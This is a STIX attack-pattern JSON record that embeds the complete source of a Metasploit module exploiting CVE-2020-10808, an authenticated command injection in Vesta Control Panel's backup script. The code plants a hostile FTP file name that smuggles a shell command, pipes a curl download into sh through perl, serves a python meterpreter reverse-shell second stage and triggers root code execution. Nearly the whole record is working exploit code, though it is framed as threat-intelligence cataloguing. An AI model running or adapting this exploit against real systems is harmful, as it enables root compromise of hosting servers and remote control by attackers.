{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--095f0390-96f4-45c3-9e4f-c8db04db403b",
    "created": "2024-08-14T17:01:52.881541Z",
    "modified": "2024-08-14T17:01:52.881544Z",
    "name": "Vesta Control Panel Authenticated Remote Code Execution",
    "description": " This module exploits an authenticated command injection vulnerability in the v-list-user-backups bash script file in Vesta Control Panel to gain remote code execution as the root user.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/vestacp_exec.rb",
            "external_id": "vestacp_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://pentest.blog/vesta-control-panel-second-order-remote-code-execution-0day-step-by-step-analysis/"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-10808"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Vesta Control Panel Authenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits an authenticated command injection vulnerability in the v-list-user-backups\n          bash script file in Vesta Control Panel to gain remote code execution as the root user.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Mehmet Ince <mehmet@mehmetince.net>' # author & msf module\n        ],\n        'References' => [\n          ['URL', 'https://pentest.blog/vesta-control-panel-second-order-remote-code-execution-0day-step-by-step-analysis/'],\n          ['CVE', '2020-10808']\n        ],\n        'DefaultOptions' => {\n          'SSL' => true,\n          'WfsDelay' => 300,\n          'Payload' => 'python/meterpreter/reverse_tcp'\n        },\n        'Platform' => ['python'],\n        'Arch' => ARCH_PYTHON,\n        'Targets' => [[ 'Automatic', {}]],\n        'Privileged' => true,\n        'DisclosureDate' => '2020-03-17',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE, ],\n          'Reliability' => [ FIRST_ATTEMPT_FAIL, ],\n          'SideEffects' => [ IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK,\t]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8083),\n        OptString.new('USERNAME', [true, 'The username to login as']),\n        OptString.new('PASSWORD', [true, 'The password to login with']),\n        OptString.new('TARGETURI', [true, 'The URI of the vulnerable instance', '/'])\n      ]\n    )\n    deregister_options('FTPUSER', 'FTPPASS')\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def login\n    #\n    # This is very simple login process. Nothing important.\n    # We will be using cookie and csrf_token across the module as instance variables.\n    #\n    print_status('Retrieving cookie and csrf token values')\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'login', '/')\n    })\n\n    unless res\n      fail_with(Failure::Unreachable, 'Target is unreachable.')\n    end\n\n    unless res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Web server error! Expected a HTTP 200 response code, but got #{res.code} instead.\")\n    end\n\n    if res.get_cookies.empty?\n      fail_with(Failure::UnexpectedReply, 'Server returned no HTTP cookies')\n    end\n\n    @cookie = res.get_cookies\n    @csrf_token = res.body.scan(/<input type=\"hidden\" name=\"token\" value=\"(.*)\">/).flatten[0] || ''\n\n    if @csrf_token.empty?\n      fail_with(Failure::UnexpectedReply, 'There is no CSRF token at HTTP response.')\n    end\n\n    print_good('Cookie and CSRF token values successfully retrieved')\n\n    print_status('Authenticating to HTTP Service with given credentials')\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'login', '/'),\n      'cookie' => @cookie,\n      'vars_post' => {\n        'token' => @csrf_token,\n        'user' => username,\n        'password' => password\n      }\n    })\n\n    unless res\n      fail_with(Failure::Unreachable, 'Target is unreachable.')\n    end\n\n    if res.body.include?('Invalid username or password.')\n      fail_with(Failure::NoAccess, 'Credentials are not valid.')\n    end\n\n    if res.body.include?('Invalid or missing token')\n      fail_with(Failure::UnexpectedReply, 'CSRF Token is wrong.')\n    end\n\n    if res.code == 302\n      if res.get_cookies.empty?\n        fail_with(Failure::UnexpectedReply, 'Server returned no HTTP cookies')\n      end\n      @cookie = res.get_cookies\n    else\n      fail_with(Failure::UnexpectedReply, \"Web server error! Expected a HTTP 302 response code, but got #{res.code} instead.\")\n    end\n  end\n\n  def start_backup_and_trigger_payload\n    #\n    # Once a scheduled backup is triggered, the v-backup-user script will be executed.\n    # This script will take the file name that we provided and will insert it into backup.conf\n    # so that the backup process can be performed correctly.\n    #\n    # At this point backup.conf should contain our payload, which we can then trigger by browsing\n    # to the /list/backup/ URL. Note that one can only trigger the backup (and therefore gain\n    # remote code execution) if no other backup processes are currently running.\n    #\n    # As a result, the exploit will check to see if a backup is currently running. If one is, it will print\n    # 'An existing backup is already running' to the console until the existing backup is completed, at which\n    # point it will trigger its own backup to trigger the command injection using the malicious command that was\n    # inserted into backup.conf\n\n    print_status('Starting scheduled backup. Exploitation may take up to 5 minutes.')\n\n    is_scheduled_backup_running = true\n\n    while is_scheduled_backup_running\n\n      # Trigger the scheduled backup process\n      res = send_request_cgi({\n        'method' => 'GET',\n        'cookie' => @cookie,\n        'uri' => normalize_uri(target_uri.path, 'schedule', 'backup', '/')\n      })\n\n      if res && res.code == 302 && res.headers['Location'] =~ %r{/list/backup/}\n        # Due to a bug in send_request_cgi we must manually redirect ourselves!\n        res = send_request_cgi({\n          'method' => 'GET',\n          'cookie' => @cookie,\n          'uri' => normalize_uri(target_uri.path, 'list', 'backup', '/')\n        })\n        if res && res.code == 200\n          if res.body.include?('An existing backup is already running. Please wait for that backup to finish.')\n            # An existing backup is taking place, so we must wait for it to finish its job!\n            print_status('It seems there is an active backup process ! Recheck after 30 second. Zzzzzz...')\n            sleep(30)\n          elsif res.body.include?('Task has been added to the queue.')\n            # Backup process is being initiated\n            print_good('Scheduled backup has been started ! ')\n          else\n            fail_with(Failure::UnexpectedReply, '/list/backup/ is reachable but replied message is unexpected.')\n          end\n        else\n          # The web server couldn't reply to the request within given timeout window because our payload\n          # executed in the background. This means that the res object will be 'nil' due to send_request_cgi()\n          # timing out, which means our payload executed!\n          print_good('Payload appears to have executed in the background. Enjoy the shells <3')\n          is_scheduled_backup_running = false\n        end\n      else\n        fail_with(Failure::UnexpectedReply, '/schedule/backup/ is not reachable.')\n      end\n    end\n  end\n\n  def payload_implant\n    #\n    # Our payload will be placed as a file name on FTP service.\n    # Payload length can't be more then 255 and SPACE can't be used because of a\n    # bug in the backend software.\n    # s\n    # Due to these limitations, the payload is fetched using curl before then\n    # being executed with perl. This perl script will then fetch the full\n    # python payload and execute it.\n    #\n    final_payload = \"curl -sSL #{@second_stage_url} | sh\".to_s.unpack1('H*')\n    p = \"perl${IFS}-e${IFS}'system(pack(qq,H#{final_payload.length},,qq,#{final_payload},))'\"\n\n    # Yet another datastore variable overriding.\n    if datastore['SSL']\n      ssl_restore = true\n      datastore['SSL'] = false\n    end\n    port_restore = datastore['RPORT']\n    datastore['RPORT'] = 21\n    datastore['FTPUSER'] = username\n    datastore['FTPPASS'] = password\n\n    #\n    # Connecting to the FTP service with same creds as web ui.\n    # Implanting the very first stage of payload as a empty file.\n    #\n    if !connect_login\n      fail_with(Failure::NoAccess, 'Unable to authenticate to FTP service')\n    end\n    print_good('Successfully authenticated to the FTP service')\n\n    res = send_cmd_data(['PUT', \".a';$(#{p});'\"], '')\n    if res.nil?\n      fail_with(Failure::UnexpectedReply, 'Failed to upload the payload to FTP server')\n    end\n    print_good('The file with the payload in the file name has been successfully uploaded.')\n    disconnect\n\n    register_file_for_cleanup(\"/home/#{username}/.a';$(#{p});'\")\n\n    # Revert datastore variables.\n    datastore['RPORT'] = port_restore\n    datastore['SSL'] = true if ssl_restore\n  end\n\n  def exploit\n    start_http_server\n    payload_implant\n    login\n    start_backup_and_trigger_payload\n  end\n\n  def on_request_uri(cli, _request)\n    print_good('First stage is executed ! Sending 2nd stage of the payload')\n    second_stage = \"python -c \\\"#{payload.encoded}\\\"\"\n    send_response(cli, second_stage, { 'Content-Type' => 'text/html' })\n    register_file_for_cleanup(\"/usr/local/vesta/data/users/#{username}/backup.conf\")\n  end\n\n  def start_http_server\n    #\n    # HttpClient and HttpServer use same SSL variable :(\n    # We don't need SSL for payload delivery so we\n    # will disable it temporarily.\n    #\n    if datastore['SSL']\n      ssl_restore = true\n      datastore['SSL'] = false\n    end\n    start_service({\n      'Uri' => {\n        'Proc' => proc do |cli, req|\n          on_request_uri(cli, req)\n        end,\n        'Path' => resource_uri\n      }\n    })\n    print_status(\"Second payload download URI is #{get_uri}\")\n    # We need to use instance variables since get_uri keeps using\n    # the SSL setting from the datastore.\n    # Once the URI is retrieved, we will restore the SSL settings within the datastore.\n    @second_stage_url = get_uri\n    datastore['SSL'] = true if ssl_restore\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-03-17",
    "x_mitre_platforms": [
        "['python']"
    ]
}